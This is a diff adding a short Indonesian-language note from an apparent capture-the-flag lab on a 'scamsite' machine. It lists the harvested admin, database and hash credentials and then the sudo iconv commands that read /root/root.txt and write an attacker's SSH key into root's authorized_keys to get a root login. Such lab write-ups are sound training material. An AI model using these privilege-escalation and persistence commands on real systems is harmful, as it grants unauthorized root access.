@@ -1,0 +1,31 @@
+dapat creds untuk subrion login `/subrion/panel`
+	- admin:Scam2021
+
+dapat creds untuk mariadb/mysql
+	- DB = wpdb
+	- user = support
+	- passw = ImAScammerLOL!123!
+
+dapat creds dari db
+	- support:$P$BPQkfsaBVCF7.anFFokpMGpfqGKnHM0
+
+
+ternyata creds untuk mariadb bisa dipakai passwd nya untuk leverage ke user scamsite
+untuk dapat flag bisa langsung pakai suid iconv
+```
+sudo /usr/bin/iconv -f 8859_1 -t 8859_1 "/root/root.txt"
+```
+
+jika ingin privesc, kita bisa pakai fungsi output pada iconv untuk menambahkan pub key kita ke `/root/.ssh/authorized_keys`
+```
+#--local
+ssh-keygen -t rsa
+# copy isi pub
+
+#--target
+echo "<isi pubkey kita>" | sudo /usr/bin/iconv -f 8859_1 -t 8859_1 -o "/root/.ssh/authorized_keys"
+
+#--local
+# login
+ssh -i private_key_hasil_keygen root@IP
+```
